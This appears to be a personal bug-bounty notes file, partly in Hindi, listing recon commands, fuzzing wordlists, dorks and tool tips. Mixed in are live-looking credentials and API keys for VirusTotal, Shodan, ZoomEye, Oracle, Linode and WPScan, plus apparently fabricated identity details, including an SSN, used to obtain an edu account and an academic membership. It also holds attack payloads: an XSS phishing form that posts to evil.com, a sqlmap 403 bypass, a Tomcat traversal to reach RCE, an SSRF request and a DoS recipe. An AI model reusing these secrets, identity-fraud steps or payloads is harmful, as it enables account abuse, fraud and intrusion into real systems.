      ----FOR HACKING RELATED-----

#Recon
 - subfinder :  netlas.io, securitytrials etc add all api key active passive dono cover ho jayega,
 - frogy     : horizontal vertical subd enum
 - final      -> echo example.com | crt.sh | subfinder| assetfinder | sublit3r   this is enough

YWRtaW46YWRtaW4==
123YWRtaW46YWRtaW4=
YWRtaW46YWRtaW4=

add to scope in burp suite all dmn
 - ^bugcrowd\.com$    : [https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/]

new bb program :
https://bugbounty.standoff365.com/en-US/programs/wildberries/

#next time vps create
 - more than 2GB RAM : bcs very lag when u do vuln assesesment in tmux and while login
 - 15-20GB space taks kali , this vps is ~70GB still space left and nice work, but i will suggest take ~100Gb
# kabhi kahi fas jao ye chize try karna
 - null, write same thing multiple times, use reputed names to bypass google-fb, random letter,https://accounts.xyz.com/xyz/xyz/xyz?client_id=hash(ahmad Halabi)
 - https://x.com/khaleedsamy12/status/1692520601338986759 : extract online any thing domain, js, file, endpoints etc [vdo]

#clone all repositories of an org
GHORG=facebookresearch; curl "https://api.github.com/orgs/$GHORG/repos?per_page=1000" | grep -o 'git@[^"]*' | sed 's/git@/https:\/\//g' |  sed 's/m:/m\//g' | xargs -L1 git clone

intersting:

- https://buckets.grayhatwarfare.com/  [seach keywords in bucket]
- https://publicwww.com/               [search in body with regex]
- https://www.nerdydata.com/           [search in sourcecode  ]
- https://codeql.github.com/           [when u hunting on code]
- https://searchfox.org/               [focus on foxzilla code search]


#github recon tool :
 1. https://github.com/s0md3v/Zen  [ Look for credentials > Extract domains and URLs > Use a static code analyzer to find vulnerabilities (or manually) > Append .patch at the end of a commit URL to reveal email address of committer or just use my Zen]
 2. https://x.com/intigriti/status/1770393093696528467

#Netlas https://x.com/Jayesh25_/status/1760641042796183716?t=XQSU10HWyjfQLsypLlzIYA&s=19
https://app.netlas.io/responses/?q=http.body:(hubspot)&page=1&indices=
https://app.netlas.io/responses/?q=http.headers.x_jenkins:* OR http.headers.x_jenkins_cli2_port:* OR http.headers.x_jenkins_session:*&page=1
https://app.netlas.io/domains/?indices=&page=1&q=domain%3A%28domain%3A%2A.paypal.com%29
https://app.netlas.io/whois/domains/?indices=&page=1&q=registrant.organization:"GRABTAXI HOLDINGS PTE. LTD"

#for automate xss: (single site hunting)
   - echo domain.com | waybackurls > urls.txt
   - cat urls.txt | grep utm > param.txt
   - cat param.txt | Gxss -p #"><img src=/ onerror=alert("samurai");> | tee -a gxss-result.txt
   - cat gxss-result.txt | go run freq.go

#origin ip disclose :P4 as a Server Security Misconfiguration > Web Application Firewall (WAF) Bypass > Direct Server Access

#recent approch
Pick Integrity vpd -> do burp scan
Lostsec methodology -> evdp,intigrity, bugcrwd
Low bugs -> Evdp


#suppose u install some pkg/tool mistakently and want to remove
 - in case "sudo apt intall ruby-notify"
 1. sudo apt purge ruby-notify      2. sudo apt remove ruby-notify

#try in console for decode base64 encode/decode
  btoa('this is how you encode in base64')
  atob('eW91IGxlYXJudCB0aGF0IHJpZ2h0')
  decodeURIComponent('https://example.com/?query=%22this%20is%20a%20url%20encoded%20string%22')

#facebook bug bounty report aread
 - https://www.facebook.com/whitehat/report
 - click "I want to provide a detailed technical report of a security vulnerability in a Meta product."

#ignore iis files on server
ASPNET~1
DAFAULT~1.ASP
DEFAULT~1.CS
GLOBAL~1.ASP/.ASA/.CS
MASTER~1.CS
MASTER~1.MAS
WEB~1.CON

  {
virustotal login :-
email : islandra@analysissa.shop , passwd : donom98005@regishub.com
email : islandra@hearkn.com , passwd : donom98005@regishub.com
1st api : b0c92c80553bf2e87df7e8259625f5932ed1ae06ee92e1b1c9ec7d096849b518
2nd api : e578cb5b82e897f2b866ff270f5fe395af163d62be60daee76667455b0828b3f
3rd api : 9de737a9c0d110299c077cf950a8f320e3827000e21febe1ce58d26317d88b56
  }

#how to use fake details:
 https://www.youtube.com/watch?v=MYGbKpG7yic
 for fake person provider: fauxid.com , fakenamegenerator.com
 fake gmail provider: emailnator.com
 fake number provider work for me while creating edu mail: quackr.io

[ https://mylu.liberty.edu/
  university id : L34718588
  ssn : 186-84-9281
  email: wwashington28@liberty.edu
  password : L34718588q
 1st name : Walter
 2nd name : Washington
 dob: feb 17 2000 ]

#shodan Academic membership
 name : wwashington1
 pass: wwashington1
 mail: wwashington28@liberty.edu

#zoomeye
 Uname: 91b850eeeef6
 Nname: enterlectury
 email: tiktoknightclub@gmail.com
 passw: Tikt0knightclub@gmail.com
 phone: +916205269511

#screen record exe login  , recording toolbar IBM exe for record screen
 first name: aditya
 last name : kr01
 email/password (both): adityakr56@outlook.com

#oracle login:
ssh -i adi-private-ssh.key ubuntu@129.159.227.6
[ mail : tiktoknightclub@gmail.com
  passwd : T1ktoknightclub@gmail.com
  mfa : mummy mobile
  region : india
  1st name: aditya
  2nd name: kumar
  addres1 : lodi katra
  patna ,bihar , 800008
  ph num : 6205269511 ]

#for connect kali in your vncserver
 - sudo  x11vnc -ncache 10 -auth guess -nap -forever -loop -repeat -rfbauth /root/.vnc/passwd -rfbport 5900 -noncache

#linode deatails
 - signup with gmail : tiktoknightclub@gmail.com
 - ph num :6205269511
 - passwd : T1ktoknightclub@gmail.com

#cert.to subdomain recon login
 - uname: adi0x01
 - email : tiktoknightclub@gmail.com
 - passwd : T1ktoknightclub@gmail.com

#Subdomain takeover
 - CNAME: DNS record that maps one domain name to another.
 - A    : record that maps a domain to an IPv4 address. ( EC2-based )
 - MX   : mail servers responsible for receiving email on behalf of a domain.
 - NS   : record of authoritative DNS servers for the domain.
he said redir into totally different site : ip jo mile usko v reverse karke dekho ki wo company ka hi hai na
#subdomain takeover for s3 : https://s3.console.aws.amazon.com
aws s3 ls s3://dev-authrecorder.brightsec.com --no-sign-request

#vulnerabilty assesment:
 - hostedscan.com : is a online scanner u dont need to use ur system, check free plan
 - nexpose : by rapid7 with awesome gui , try 30day trial , setup on system access on browser , with multiple feature.
 - rengine : is a reconnaissance and asset discovery with features like subdomain enumeration, visual mapping, and screenshot collection.
 - Axiom : automated OSINT, network mapping, and vulnerability analysis.

#curl cmd
curl -X GET http://domain.com -i [for header + body]
curl -X GET http://domain.com -ik [for header]
curl -X OPTIONS http://domain.com -i
curl -X POST http://domain.com -i s
curl -X GET http://domain.com -i -d "user:adi&pass:123&email:adi@gmail.com"
curl -H "Header1: Value1" -H "Header2: Value2" https://example.com
curl -s "https://web.archive.org/cdx/search/cdx?url=*.clicktime.com&fl=original&collapse=urlkey&filter"  [-s for silence, show only result not response]

#extract files
      myfile.zip     --> unzip myfile.zip
      myfile.tgz     --> tar -xvzf myfile.tgz     [x=extract  , v=verbose , z=gnuzip , f=file]
      myfile.tar.gz  --> tar -xvzf myfile.tar.gz


dirsearch -t 30 -e "*" -r -i 200 --full-url -u https://invoice.abc.com/  [https://rootxravi.medium.com/exposed-invoice-urls-a-gateway-to-customer-client-pii-leakage-dabe59689144 ]
#hepful
 - telnet www.clicktime.com : cmd use to connect with ssh it auto convert to ip and try to connect , u need creds to connect bcs it provide secure connection

#burp license:-
   - go to https://portswigger.net/burp/pro/trial
   - https://generator.email/inbox3/  => provide email (liverpool29@feelmyheartwithsong.com) 5min later refresh pg
   - smtp ,2nd base64 decode , u get license and name to login [ctrl F to find license key]
   - https://app.interactsh.com/#/ [online server]

#burpsuit
   - ctrl + shift + U = decode the url
   - change
   - in target > engagement tools > analyze target > parameters [ u find parameters to test xssi,sqli,lfi etc]
#redstrom.io indonesian bbp

wp-plugin :  WPS Hide Login [looks like this: https://foo.com/conquerer]

#https://www.giuspen.net/cherrytree/ = exe
foxapoj196@carpetra.com

#main focus
 sqli
 xss
 http smuggling

 #for blind xss [ https://blindf.com/]

#waymore
 git clone repo
 cd waymore/
 sudo python setup.py install
 python waymore.py -i origin-express-bcalpdc.att.com -mode B | xnl-linkfinder [B for endpoint grep from response/source code]

 #postman use when u work with lot of api's update,parse etc or when application process too much that time postman is far more better than burp us can make script there also. (react.js has too many api's)

 #recon
   for domain finding: use Shuffledns, Findomain, chaos-client, massdns, subfinder, assetfinder ,dnsrecon,knock ,crt.sh ,amass, puredns (is better than altdns and massdns)
   for content discovery: use feroxbuster and ferricoxide
   for sshot : eyewitness --web -f uniq.txt -d /path_to_save_screenshots ---no-prompt --timeout 20 [this is direct cmd, this is good in installing and report styling in csv ,apt install eyew -y]
   for port scaning : NMAP
   - scan ip subnet by [nmap 192.168.1.0/24] [nmap -p 80,443 -T4 -A -oA detailed_scan 192.168.1.0/24] {by this u get more ips wide range not domains} {https://hackerone.com/reports/398797}
   - amass enum -passive -norecursive -noalts -d indeed.com | httpx -title
   - domain hosted on same server : https://www.ipneighbour.com/
   - https://jsmon.sh/ : online  urls, js ,scanner, file, links

# SAML Security Testing Tutorial:

1 - https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/
2 - https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/
3 - https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/
Surface: https://github.com/kelbyludwig/saml-attack-surface
Examples:
- http://secretsofappsecurity.blogspot.com/2017/01/saml-security-xml-external-entity-attack.html
- https://seanmelia.wordpress.com/2016/01/09/xxe-via-saml/
- https://hackerone.com/reports/136169

#ibrahimxss golden pack : wget https://cdn.fs.teachablecdn.com/M6pGV924SRWYbhMpVlka
------------------

save to notion twitter layout
 1/ tweet
 2/ tags
 3/ content img
 4/ type
 5/ cover
 6/ author
 7/ icon
 8/ date

 save to notion medium layout
  1/ report About
  2/ tags
  3/ cover
  4/ title
  5/ auhtor
  6/ icon
  7/ date
  8/ link
i clone twitter databse layout and then edit my requirment in (notion app)

#calculate favicon icon/hash :
 -> https://favicon-hash.kmsec.uk/
 -> https://github.com/devanshbatham/FavFreak

#create a zip file
  zip -r dir_name.zip urls.txt [ -r for recursive ; dir_name.zip for kya naam doge after compress ; urls.txt for kis chiz ko compress krna hai ]
  apt install zip

#share file between vps to local open cmd first then write this [https://www.youtube.com/watch?v=X1tXV_hDTmQ]
  - scp -p 22 root@139.59.93.216:/home/aditya/bb-targets/planner5d/params-result.txt.zip C:\Users\Hp\Desktop
       [scp -p 22 vps-addr:location.zip destination]
       [must create a zip file  before sharing, open cmd in local enter vps addr path to zip destination path or use . dot to save in current directory]

#share file between local to vps, open powershell :
  - scp -P 22 .\Desktop\cent-template.zip  root@139.59.93.216:/home/aditya/        [capital -P port]

#recon-subdomains
 -  https://003random.com/posts/archived/2019/01/18/advanced-recon-subdomains/ ,  https://003random.com/posts/archived/2019/01/31/expanding-your-scope-recon-automation/ [massdns ,altdns , nmap, quick scripts]

#amass
   - amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
cat amass.txt | aquatone -ports xlarge -out aqua_$1
nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt   [https://medium.com/@levshmelevv/10-000-bounty-for-exposed-git-to-rce-304c7e1f54]
   amass official guide
   - $ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -ip -dir amass4owasp -config /root/amass/config.yaml -o amass_results_owasp.txt
   $ amass enum -d owasp.org -norecursive -wm "zzz-?l?l?l" -dir amass4owasp
   $ amass intel -org 'Example Ltd'


#sqlmap
   Someone asked me how to pass JSON data in SQLMAP, here is what I used:
   sqlmap -u 'https://internal.sudomain.target.com' --data '{"User":"abcdefg","Pwd":"Abc@123"}' --random-agent --ignore-code=403 --dbs --hex
   --ignore-code=403  ==> Bypass HTTP 403 Forbidden
 - userefuzz tool for test sql in all header req

# googles interested domains
 - ssl:"edgestatic" [in shodan , it show 4 cves] [it from "i.ytimg.com" cert] [https://login.gestaosaneamentoweb.com.br/]
 - https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwigvcuv0cKAAxUR1jgGHWatCa84PBAWegQIGxAB&url=https%3A%2F%2Fadmin.google.com%2Fhow2learning.com%2FDashboard%3Fp%3D451%2Fwp-admin%2Finstall.php&usg=AOvVaw1eRAEs3Fo51FhOSwEnrNPN&opi=89978449 :[interseting but no idean]
 - https://scholar.google.com/citations?view_op=list_works&update_op=upload_photo&hl=tr [for xss,file upload]
 - https://colab.research.google.com/drive/1lYehNSQA9_9ABR83Tr1W86nzW9CETytr#scrollTo=4QjpD6i_t7lO [for injections and idors attcks]
 - https://login.corp.google.com/request?s=acrolinx-prod.corp.google.com:21/uberproxy/&d=https://acrolinx-prod.corp.google.com/%3Fupxsrf%3DALMiBoIMI5ptvFh_E748v98yoF672GX_mPdFN__A00gvgxUmQQ:1693851995638&maxAge=1200&authLevel=2000000&keyIds=M9V,bLf&c=4
 - https://acs-autopush.voice.google.com/ [found 403 ,try dirsearch or nmap ]

#fb test event feature and game feature
 - https://www.facebook.com/events/birthdays

#penetration testing frameworks
   gloom framework ,

#tips
   - amd : for linux base kali,ubuntu,parrot,etc
   - arm : for iot like rusberrpi

#wordpress ATO
   1. check wp-admin page inurl,
   2. http://foo.com/wp-admin/install.php [ if vulnerable it show to select lang and continue to login, if not vulnerable:wordpress aready installed]
   3. (Note: You will get a similar endpoint on many WordPress websites but new registration button/functionality might be disabled on that website)
   4. https://www.freemysqlhosting.net/ [ for free database use in this case]

#test login sites [manually check even subdomains are above 6k+]
   -  no signup page only the login page
   - use waybackurls and gau and sort by [sort -u > xss_list.txt]
   - use gospider to caught urls,js,and css files
   - redirects to login page? any validation on the client-side or on the server-side [use burp or gospider resuts]
   - disable javascript in my browser to access without credintial
   - check every input field : xss,sql in otp,urls,form

# how check open redir vuln
   - check normal inurl , in request body or header (read hackerone report) , content spoofing.

#path/dir traversal
 reverse proxy used for: resource sharing, load balance, cache , security
 why i look for this vuln bcs somewhere it helps to fuzz
  - where and when i use this trick to fuzz or bypass
  - sometimes via this exposed login portal

 how did he find reverse proxy
  - check response where header "server: nginx" show web-server where hosted
  - by set-cookie header he identified that its a default cookie of "apache tomcat" means reverse proxy apache tomcat handles whole request (jsessionid=C4E5824F9EAE4....)
  namhamsec how identified
   - http://example.com/xyzz [404 file not found , nginx/1.18.0]
   - http://example.com/staff  [403]
   - http://example.com/staff/xyzz [show 404 but error not by nginx (differnt) means here it parse to tomcat web-server, means "staff" file is hosted in tomcat]
   - http://example.com/staff/..;/manager/html  [now use traversal trick to go root dir of tomcat and access "manager/html" dir use for rce ]
  http://example.com/foo;NAME=ADITYA/bar/   [i think betn folder u can add ur own parameter]



#hint
   - redirects to login page
   - If u see the login page and there are no signup options use gospider tool or waybackurls ,ffuf
   - /admin but it redirects to /admin/login.asp [302], so fuzzing started directories bcs any other not redirecting us to any .asp endpoint [use gospider,seclist discovery, arjun ]
   - if session token is reflecting use cache poinsing in its parameter
#how people use wordlist
   - when a 403 found use common.txt with ffuf, found a dir with 403 again use common.txt with ffuf

#crlf technique  unique & awesome : https://twitter.com/Black2Fan/status/1700545321800224855?s=20

#arjun :
   - time python3 arjun.py -u http://site.com/

--------------------------------------------------------------------------------

#SECLIST
 - nginx.txt, local-port.txt , iis.fuzz.txt , PHP.fuzz.txt , common.txt( dutch etc) , webcontent/api , raft-small-directories.txt , raft-small-extension.txt(identification) , raft-small-files.txt(log.txt) , raft-small-words , RobotsDisallowed-Top1000.txt (check whats allow from this wdlist) , CommonAdminBase64.txt , wordpress-all-levels.txt , all.txt , context (admin.txt,error.txt,index.txt,install.txt,log.txt,setup.txt,test.txt)=> for all realted words and bypass , language (sh.txt,js.txt,asp,jsp,java,cfm,rb,py,php3-5) , common-http-ports.txt , common-router-ips.txt , IPGenerator

 - (#/../console/) , (..;/console/) , (..;/console/) , (../console/) (/*/): this technique to bypass something (reverse-proxy-inconsistencies.txt)

--------------------------------------------------------------------------------

#how to fuzz
   raft-medium-words : to identify the architecture
   raft-medium-files : artitect based .php, .asp, .cfm, .axd , .html , .txt , .xml , .cgi , .py
   raft-medium-dirs  : this is compulsory to use bcs it contain every-dir found by cms,site,etc

#ffuf
   - ffuf -u http://indeed.com/FUZZ.html,php,zip,cfm,py -w words -c -mc 200-299,301,302,307,401,403,405,500 [https://t.ly/LVGrZ]
   - ffuf -u http://domain.com/FUZZ -recursion [find under and under folder]
   - ffuf -u domain.com -X FUZZ [http method fuzz]
   - ffuf -u http://W1.com/W2 -w ~/domains-list.txt:W1 -w ~/seclist/big-raft.txt:W2 [so the w1 for subdoomains list of subfinder etc and W2 for FUZZ]
   - ffuf -u http://domain.com/FUZZ -sf [sf for if the last 50 response 4xx or 5xx it will stop bcs site block our requ]
   - ffuf -u https://auth.meta.com/?FUZZ=evil.com [find similar redir parameter] [wordlist: https://t.ly/-WUwu] cnmiller/parameters.txt
   - ffuf -u http://je295b4x.start.ctfio.com/FUZZ -w common.txt -t 2 -p 0.1 [t for thread -p for pause 0.1 then req another]
   - ffuf -u http://abkz928o.vulnbegin.ctfio.com/cpadmin/FUZZ -w common.txt -t 10 -H "Cookie: token=2eff535bd75e77b62c70ba1e4dcb2873; $cookie"
   - ffuf -u http://vulnbegin.ctfio.com/FUZZ -w ctf-content.txt -t 5 -p 0.1 -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $cookie; token=123xyz"
   -mc 200-299,301,302,307,401,403,405,500,501
   - ffuf -u http://vulnbegin.ctfio.com/FUZZ -w ctf-content.txt -mc all -fw 13 [-mc for match all status-code , -fw for filter-out words with 13]
   - ffuf -u https://evil.com/FUZZ -w ~/while-hunting/orwa/xml.txt -mc all -of md -o qqqqqqqqqqqqqqq.txt  [-of md :OUTPUT in markdown/json ]
   - extra : [Remove the duplicates by other -f filters EX… Size use -fs 312 / Words use -fw 17 / Liens use -fl 7 ]

   - ffuf -mc all -c  -u "https://admin,website,com/FUZZ" -w wordlist -D -e js,php,bak,txt,html,zip,sql,old,gz,log,swp,yaml,yml,config,save,rsa [When you try to access admin,website,com and redirect to login,website,com. try to fuzz]
   [if colon u see means it header and if u see "=" means it is cookie]

   - wfuzz -u "https://auth.meta.com/?FUZZ=evil.com" -w wordlist.txt --hl=76 [this tool for verbose]
   - essential skill

#nuclei [https://cloud.projectdiscovery.io/]
   -u: for specify single target
   -l: path of file of target to scan
   -t: for specify the template
   -tags : for specific tags in comma seperated ex:cve,high,xss  [https://github.com/projectdiscovery/nuclei-templates/blob/main/TEMPLATES-STATS.md]
   -s : severity low,high,medium,critical
   -silent : display findings only
   -a : for author [ https://github.com/projectdiscovery/nuclei-templates/blob/main/TEMPLATES-STATS.md ] [all contributers details]
   -at : type of payload combinations to perform (batteringram,pitchfork,clusterbomb)
   -fm : fuzzing-mode (multiple, single)
[-as ] it identify tech and choose a/c to tags
[-tags] jira,generic
[-rl 3 -c 2] u can both use at time
(-timeout) new connection deafaul5 make1 to fast scan
(-retries) default, Nuclei won’t retry a failed
(-resume) /path/to/resume-file.cfg {.cfg file automatic creatd when u ctrl+c}
https://github.com/projectdiscovery/nuclei-templates/blob/29edb66f1d35dc17ef6663db27e4367a94b9d1fc/http/technologies/tech-detect.yaml#L2611 [all tech dect]
# recon
   subfinder -d target.com -silent -o subs.txt | httpx -title -content-length -screenshot -csp-probe -status-code -silent
   csp-probe attribute in httpx tool give u more domain leaverage [https://www.youtube.com/watch?v=t37Xlp4qSaY&t=213s]
   for fast recon-scan use framework [ https://github.com/0xdekster/ReconNote ]
   python3 dirsearch.py -l target.txt --deep-recursive [not necessary to give a wordlist but if u have give]
   nmap -p- -T3 --max-rtt-timeout 500ms -Pn -6 -A --traceroute TARGET_IP_OR_HOST
   scan whole ip subnet by [nmap 192.168.1.0/24] [nmap -p 80,443 -T4 -A -oA detailed_scan 192.168.1.0/24] {by this u get more ips wide range not domains}

#eyewitness
 sudo apt install eyewitness
 usage1: eyewitness --web -f domains.txt -d ./output-here -t 15 --max-retries 4 --timeout 30  --delay 2 --no-prompt --resume ew.db
 usage2: eyewitness --web -x Filename.xml       [use here Nmap XML result or .Nessus file output]

#what type of sites
    - ecommerce
    - online services
    - web
    - payments
    - gov sites

#hunt with ai
   Prompt:
   - Summarize <insert program>’s bug bounty program in 3 bullet points including scope, rewards, and out-of-scope. Make it concise.

   Prompt:
   - Explain the impact of what an attacker could do with a UUID IDOR vulnerability and any caveats for exploitation in 3 sentences as part of a bug bounty report and optimize for maximum reward.

   Prompt:
   - Summarize the exploit for the following bug bounty report in numbered bullets to a target audience of bug bounty hunters: <paste text from disclosed report

# for xss paylaod: [from h1 report 1810656]
   https://labs.history.state.gov/card.xq?id=%3C/title%3E%3Cbody%20style=%22background:%20green;%22%3E%3Cdiv%20class=%22container%22%3E%3Cform%20action=%22https://www.evil.com%22%20method=%22post%22%20class=%22form%22%20style=%22display:%20block;%22%3E%3Clabel%20for=%22pnumber%22%3Ephone%20number%20%3C/label%3E%3Cbr%3E%3Cinput%20type=%22tel%22%20name=%22pnumber%22%20id=%22pnumber%22%20value=%22%22%20placeholder=%22phone%20number%22%20maxlength=%2211%22inputmode=%22tel%22%20size=%2240px%22%3E%3Cbr%3E%3Clabel%20for=%22pword%22%3Epassword%3C/label%3E%3Cbr%3E%3Cinput%20type=%22password%22%20name=%22pword%22%20id=%22pword%22%20value=%22%22%20placeholder=%22password%22%20maxlength=%22200%22%20size=%2240px%22height=%22100px%22%3E%3Cbr%3E%3Cinput%20type=%22submit%22%20value=%22login%22%3E%3C/form%3E%3C/div%3E%3Cfont%20style=%22font-size:%20100px;color:%20red;%22%20class=%22welcome%22%3EWE%20ARE%20HACKERONE%3C/font%3E

# theory u can use in reports
   - I have never gotten a report triaged this fast before - impressive! Thanks for the feedback and please let me know if there is any way I can help.

   - I can confirm that this patch is working. Great job and thank you very much for the bounty!

   -Got listed in Microsoft as a Security Researcher for reporting a Security Vulnerability :)

#wpscan [to dectect wordpress vuln plugin & theme ]
   1. wpscan --url https://enterprise.dailymotion.com -e vp, vt, cb --api-token 66wd5ttlJjcyoSY53ZQngci0vI60Nzs2kIdhdW3gKH0 --random-user-agent --ignore-main-redirect --force --disable-tls-checks

   2. some times wordpress not install in root directory so u need to specify the wp-content folder
   wpscan — url https://redacted.com/news/artcile/wp-content — wp-content-dir -e vp — api-token YOUR_API_TOKEN — random-user-agent — ignore-main-redirect — force — disable-tls-checks

   3. sometimes wpscan not identify some plugin or theme so look in view-source page to exploit

 { reports some noteicible points

#forced-browsing
   Unauthorized access to event mgt system:
   Function- You can create public or private invents
   1. site. com/xyz/username?view=current_events
   2.Change username and forward request
   3. Able to just view title, date created and event owner name
   4. Escalated to access via manual headers
   5. Used X-Rewrite-URL: /current_events
   6. Forward request . Now able to see full event data
   7. For performing every step I need to add X-Rewrite-URL: /action_here
   Tip: Always add headers to bypass single based verification on sensitive action. P2 marked as P1

#SSRF
POST /_hcms/perf HTTP/1.0
Host: http://target.com
X-Forwarded-For: http://collaborator.net
Note:
 -HTTP version changed from 1.1 to 1.0
 -GET to POST. And MIME type must be txt
Remaining : Google it

#Application level DOS Confluence 7.6.2
1. Go to site, site.atlassian .net
2. Paramater with following endpoint /issues/?jql=
3. Craft any payload with it and search using jql=
4. Final url site.atlassian. Net/issues/?jql=your-payload
Perform same action for 5000 times .
You may need to perform it for more time. Until you get dos response. 1st
check the version of confluence,
Do it on your own responsibilities
 }

#Burp suite search keywords:,
   - uri=,url=,key=,.json,oauth,redirect=,api,dashboard,config. , =http,&api,@ (for user based URL for ssrf),dir,file,php_path,page,data,val,root,?q,?query , Token

#wordlist
   - orwa [specific ext]
   - six2dez [all path,ext,etc found in 1 list onelistforallshort.txt]
   - assetnote
   - https://github.com/AlbusSec/Penetration-List/blob/main/01_Information_Disclosure_Vulnerability_Material/Sensitive-Directory-list/Infodisclosure_Sensitive-list-1.txt
   - https://github.com/tamimhasan404/Chart-Of-Wordlist
#tools
   - slurp : AWS bucket enumerator [https://t.ly/DSuSn]
   - SecretFinder : for read source code and show secrets
   - Dirsearch and ffuf both use : dirsearch use encoding,internal path,ip,codes
   - waybackurls and linkfinder both use : a python script that finds endpoints in JavaScript files [https://t.ly/AN009] {secretfinder is much useful than linkfinder}
   - mantra : for find leak api keys in jf files and pages
   - uro / urldedupe : for exclude  uninteresting/duplicate [sqli]
   - prettyrecon.com , rustscan [for quick ports scan]
   - uncover : u all relates ips of domain.com
   - OpenRedireX : open redir bypass
   - 4-ZERO-3 : header,protocol,port,http-method,url-encode,mod-security,sqli bypass all

WORDLIST :
 - use raft-large with _words , .words ,
 - dirsearch use

#dirsearch sensitive data enum:-
   dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://target/app
   this is make personally by giving time:  dirsearch -w raft-medium-dir.txt -u http://google.com --exclude-sizes=0B,1086B --deep-recursive --tor  --random-agent --exit-on-error -e yaml,pem,key,md5,conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,xml,bin,java,local.php,readme,errors,raw,err,temp,ini

#all company useful dorks
   - https://www.blackhatethicalhacking.com/tools/dorks-collections-list/ : [dorks for crypto,backlink,google,shodan,github,token]
   - gitdorker [https://t.ly/c_jCX] : automate githb dork
   - quick google dorks : [ https://dorks.faisalahmed.me/ ]

#mydorks
   site:"domain.com" ext:php|ext:html|ext:shtml|ext:aspx|ext:xml|ext:conf|ext:cnf|ext:reg|ext:inf|ext:rdp|ext:cfg|ext:txt|ext:ora|ext:ini
   site:http://site.com intitle:index.of
   /.DS_Store [https://xelkomy.medium.com/how-i-was-able-to-get-1000-bounty-from-a-ds-store-file-dc2b7175e92c] : [ if u find ds-store file use this link to exploit under dir]


[ fofa query : domain="glia.com" && status_code!="302" && host!="blog.glia.com" && host!="app.beta.glia.com" && host!="test-app.beta.glia.com " && host!="api.glia.com" && host!="a09aa74e1ea59cff5.004164.app.glia.com" && host!="jzugwa65f905b1aee88bd3.026s001.app.glia.com" && host!="165040.app.glia.com" && host!="old.media.glia.com " && host!="help.media.glia.com" && host!="test-api.beta.glia.com" && host!="media.glia.com" && host!="app.glia.com" && host!="10.media.glia.com" && host!="5.media.glia.com"  && host!="profiles.beta.glia.com" && host!="www.glia.com" && host!="proxy-qa.beta.glia.com " && host!="1f9d-api.beta.glia.com" && host!="content.appapps.beta.glia.com"  && host!="cwuzfapp.profiles.beta.glia.com" && host!="2f6343e2.beta.glia.com"  && host!="logs.glia.com"  && host!="engagement-search-opensearch.glia.com"  && host!="appapps.beta.glia.com" && host!="logs.beta.glia.com" && host!="mob.pubsub.beta.glia.com"  && host!="proxy.beta.glia.com"  && host!="omnibrowse-iframe.beta.glia.com" && host!="php.omnibrowse-iframe.beta.glia.com"  && host!="pubsub.beta.glia.com" ]

#censys dork
 - CN=*bentley.com [ssl.cert.cn=]
#fofa dork
 - icon_hash="1983356674" && asn="AS3209"
#shodan dorks
   usage
   1. shodan download --limit 10000 your_query (but default download --limit set 1000 change it to high )
   2. shodan info (how much credit left)
   - kibana content-length:217 : kibana is frontent tool , dont know about len why it use [https://medium.com/techiepedia/my-first-bounty-via-shodan-search-engine-d4d99cb0a9d7]
   - censys search like (target.com) and services.software.product=`jenkins`
   - shodan querries like this: Set-Cookie: mongo-express=” “200 OK”
   - ssl: “target[.]com” 200 http.title: “dashboard” –unauthenticated dashboard
   - org:“target.com” x-jenkins 200 — unauthenticated jenkins server
   - ssl:“target.com” 200 proftpd port:21 — proftpd port:21 org:“target.com”
   - http.html:zabbix — CVE-2022–24255 Main & Admin Portals: Authentication
   - Bypass org:“target.com” http.title:“phpmyadmin”
   - ssl.cert.subject.CN:"comp.com"
   - http.favicon.hash:450899026

{shodan credit
default -l > 2 credit use
-l 200 >> 3 credit use
-l 500 >> 6 credit use
-l 10000 >> 41 credit use (4k+ result)
-l 10000 >> 1 credit use (121 result )
means 1api request download 100 result, means credit use the num of result download
query : http.favicon.hash:"-485487831" http.status:200 org:"Service Provider"
this query 121 result in web, when u use cli it use 1 api bcs it near of 100 result, yes cli gives 242 but after sort uique it gives 121 with all port 443,80,10443
}

#look bugs in cryptocurrency sites
   - open-redir
   - xss
   - sql

#extensions for burp
   - Golden Nuggets : it help to make ur own wordlist like param,uri,words.txt {https://www.youtube.com/watch?v=t37Xlp4qSaY&t=480s}
   - reflector : while enum live xss pointer [https://www.youtube.com/watch?v=vGjHkstKyQI]
   - autorize : for idor it change auto user-->admin [https://www.youtube.com/watch?v=vGjHkstKyQI]
   - JSpector : it create issue with secrets, normally autmating tool show secrets but how exploit {https://www.youtube.com/watch?v=HJmSsXGBTgQ}

payment/wallet/banking platform
   - OPENREDIRECT bcs it need multiple check-up.
   - ssl cookie without secure flag
   - CSRF also [dashnboard]
   - subdomain takover

chating/websocket
   - rc4 cipher  [it use for streming]

#how to use wordlist and where
   - 403,admin : seclist/common.txt and found something(log, .ext) again fuzz

#extension
   - recordmydesktop : build in kali (https://www.kali.org/tools/recordmydesktop/)
   - dotgit : chrome extension for leak .git files  [ https://www.youtube.com/watch?v=g3qcwe0RspE ]
   - sqlite viewer : if u find file via dotgit u can check in this extension [pretty view] [https://www.youtube.com/watch?v=g3qcwe0RspE]
   - link gopher  : red&blue chain icon ,  help to extract links/domains from site or google/shodan


#open redirection automation
